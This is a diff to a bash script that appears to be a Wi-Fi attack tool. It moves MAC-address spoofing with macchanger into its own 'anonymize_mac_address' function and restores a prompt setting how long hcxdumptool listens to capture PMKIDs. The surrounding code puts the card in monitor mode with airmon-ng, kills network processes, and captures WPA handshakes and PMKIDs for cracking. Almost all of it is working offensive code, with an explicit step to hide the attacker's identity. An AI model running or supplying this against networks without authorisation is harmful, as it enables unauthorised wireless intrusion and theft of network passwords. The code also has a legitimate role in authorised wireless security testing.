@@ -34,27 +34,28 @@ function enable_managed_mode(){
     echo -e "${good}[+]${nc} Network manager restarted."
 }
 
+function anonymize_mac_address(){
+    echo -e "\n${doing}[~]${nc} Anonymizing MAC address"; sleep 0.5
+    ifconfig ${network_card} down && macchanger -a ${network_card} &>/dev/null
+    ifconfig ${network_card} up &>/dev/null
+    macaddress=$(macchanger -s ${network_card} | grep -i "Current" | xargs | cut -d ' ' -f '3-100')
+    echo -e "\n${good}[+]${nc} New MAC address: $macaddress"; sleep 0.5
+}
+
 function enable_monitor_mode(){
     echo -e "\n${doing}[~]${nc} Taking network card to monitor mode"
     airmon-ng start $network_card &>/dev/null
     ifconfig ${network_card}mon &>/dev/null
     if [ "$(echo $?)" == "0" ]; then
         network_card="${network_card}mon"
-    else
-        ifconfig ${network_card} down && macchanger -a ${network_card} &>/dev/null
-        ifconfig ${network_card} up &>/dev/null
     fi
-    echo -e "\n${good}[+]${nc} Network card to monitor mode"; sleep 0.5
 
+    echo -e "\n${good}[+]${nc} Network card in monitor mode"; sleep 0.5
+    anonymize_mac_address
     echo -e "\n${doing}[~]${nc} Killing processes that could interfer"; sleep 0.5
     killall wpa_supplicant dhclient 2>/dev/null
     airmon-ng check kill &>/dev/null
     echo -e "\n${good}[+]${nc} Processes killed correctly"; sleep 0.5
-
-    echo -e "\n${doing}[~]${nc} Anonymizing MAC address"; sleep 0.5
-    macaddress=$(macchanger -s ${network_card} | grep -i "Current" | xargs | cut -d ' ' -f '3-100')
-
-    echo -e "\n${good}[+]${nc} New MAC address: $macaddress"; sleep 0.5
 }
 
 function kill_remaining_processes(){
@@ -388,9 +389,8 @@ function handshake(){
 }
 
 function pmkid(){
-    #echo -ne "\n${ask}[?]${nc} How many minutes do you want to listen? [Recommended: 1]: " && read minutes
-    #minutes=$(( minutes * 60 ))
-    minutes=60
+    echo -ne "\n${ask}[?]${nc} How many minutes do you want to listen? [Recommended: 1]: " && read minutes
+    minutes=$(( $minutes * 60 ))
     echo -e "\n${doing}[~]${nc} Start listening at $(date +%H:%M:%S)..."
     xterm -hold -e "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid" &
     hcxdumptool_xterm_pid=$!
